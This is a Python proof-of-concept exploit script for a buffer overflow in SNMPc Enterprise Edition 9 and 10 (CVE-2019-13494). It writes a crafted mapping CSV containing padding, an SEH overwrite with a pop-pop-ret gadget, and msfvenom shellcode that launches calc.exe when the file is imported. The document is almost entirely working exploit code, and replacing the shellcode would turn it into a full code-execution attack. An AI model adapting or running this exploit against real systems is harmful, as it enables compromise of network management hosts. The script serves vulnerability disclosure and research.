#!/usr/bin/python
# -*- coding: utf-8 -*-

#--------------------------------------------------------------------#
# Exploit: SNMPc Enterprise Edition (9 & 10) (Mapping File Name BOF) #   
# Date: 11 July 2019                                                 #
# Exploit Author: @xerubus | mogozobo.com                            #
# Vendor Homepage: https://www.castlerock.com/                       #
# Software Linke: https://www.castlerock.com/products/snmpc/         #
# Version: Enterprise Editioin 9 & 10                                #
# Tested on:  Windows 7                                              # 
# CVE-ID: CVE-2019-13494                                             #
# Full write-up: https://www.mogozobo.com/?p=3534                    #
#--------------------------------------------------------------------#
import sys, os  
os.system('clear')

print("""\
        _  _
  ___ (~ )( ~)
 /   \_\ \/ /   
|   D_ ]\ \/  -= SNMPc_Mapping_BOF by @xerubus =-    
|   D _]/\ \  -= We all have something to hide =-
 \___/ / /\ \\
      (_ )( _)
      @Xerubus    
                    """)

filename="evilmap.csv"
junk = "A" * 2064    
nseh = "\xeb\x07\x90\x90"      # short jmp to 0018f58d  \xeb\x07\x90\x90
seh = "\x05\x3c\x0e\x10"       # 0x100e3c05 ; pop esi # pop edi # ret (C:\program files (x86)\snmpc network manager\CRDBAPI.dll)

# Pre-padding of mapping file.  Note mandatory trailing character return.
pre_padding = ( 
"Name,Type,Address,ObjectID,Description,ID,Group1,Group2,Icon,Bitmap,Bitmap Scale,Shape/Thickness,Parent,Coordinates,Linked Nodes,Show Label,API Exec,MAC,Polling Agent,Poll Interval,Poll Timeout,Poll Retries,Status Variable,Status Value,Status Expression,Services,Status,Get Community,Set Community,Trap Community,Read Access Mode,Read/Write Access Mode,V3 NoAuth User,V3 Auth User,V3 Auth Password,V3 Priv Password"
"\"Root Subnet\",\"Subnet\",\"\",\"\",\"\",\"2\",\"000=Unknown\",\"\",\"auto.ico\",\"\",\"2\",\"Square\",\"(NULL)\",\"(0,0)\",\"N/A\",\"True\",\"auto.exe\",\"00 00 00 00 00 00\",\"127.0.0.1\",\"30\",\"2\",\"2\",\"\",\"0\",\"0\",\"\",\"Normal-Green\",\"public\",\"netman\",\"public\",\"SNMP V1\",\"SNMP V1\",\"\",\"\",\"\",\"\"\n"
"\"")

# Post-padding of mapping file.  Note mandatory trailing character return.
post_padding = ( 
"\",\"Device\",\"127.0.0.1\",\"1.3.6.1.4.1.29671.2.107\",\"\",\"3\",\"000=Unknown\",\"000=Unknown\",\"auto.ico\",\"\",\"2\",\"Square\",\"Root Subnet(2)\",\"(-16,-64)\",\"N/A\",\"True\",\"auto.exe\",\"00 00 00 00 00 00\",\"127.0.0.1\",\"30\",\"2\",\"2\",\"\",\"0\",\"=\",\"\",\"Normal-Green\",\"public\",\"netman\",\"public\",\"SNMP V1\",\"SNMP V1\",\"\",\"\",\"\",\"\"\n")

# msfvenom —platform windows -p windows/exec cmd=calc.exe -b "\x00\x0a\x0d" -f c
shellcode = (
"\xda\xcc\xd9\x74\x24\xf4\xba\xd9\xa1\x94\x48\x5f\x2b\xc9\xb1"
"\x31\x31\x57\x18\x83\xc7\x04\x03\x57\xcd\x43\x61\xb4\x05\x01"
"\x8a\x45\xd5\x66\x02\xa0\xe4\xa6\x70\xa0\x56\x17\xf2\xe4\x5a"
"\xdc\x56\x1d\xe9\x90\x7e\x12\x5a\x1e\x59\x1d\x5b\x33\x99\x3c"
"\xdf\x4e\xce\x9e\xde\x80\x03\xde\x27\xfc\xee\xb2\xf0\x8a\x5d"
"\x23\x75\xc6\x5d\xc8\xc5\xc6\xe5\x2d\x9d\xe9\xc4\xe3\x96\xb3"
"\xc6\x02\x7b\xc8\x4e\x1d\x98\xf5\x19\x96\x6a\x81\x9b\x7e\xa3"
"\x6a\x37\xbf\x0c\x99\x49\x87\xaa\x42\x3c\xf1\xc9\xff\x47\xc6"
"\xb0\xdb\xc2\xdd\x12\xaf\x75\x3a\xa3\x7c\xe3\xc9\xaf\xc9\x67"
"\x95\xb3\xcc\xa4\xad\xcf\x45\x4b\x62\x46\x1d\x68\xa6\x03\xc5"
"\x11\xff\xe9\xa8\x2e\x1f\x52\x14\x8b\x6b\x7e\x41\xa6\x31\x14"
"\x94\x34\x4c\x5a\x96\x46\x4f\xca\xff\x77\xc4\x85\x78\x88\x0f"
"\xe2\x77\xc2\x12\x42\x10\x8b\xc6\xd7\x7d\x2c\x3d\x1b\x78\xaf"
"\xb4\xe3\x7f\xaf\xbc\xe6\xc4\x77\x2c\x9a\x55\x12\x52\x09\x55"
"\x37\x31\xcc\xc5\xdb\x98\x6b\x6e\x79\xe5")


print "[+] Building payload.."
payload = "\x90" * 10 + shellcode
print "[+] Creating buffer.."
buffer = pre_padding + junk + nseh + seh + payload + "\x90" * 10 + post_padding
print "[+] Writing evil mapping file.."
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
print "[+] Done.  Import evilmap.csv into SNMPc and A Wild Calc Appears!\n\n"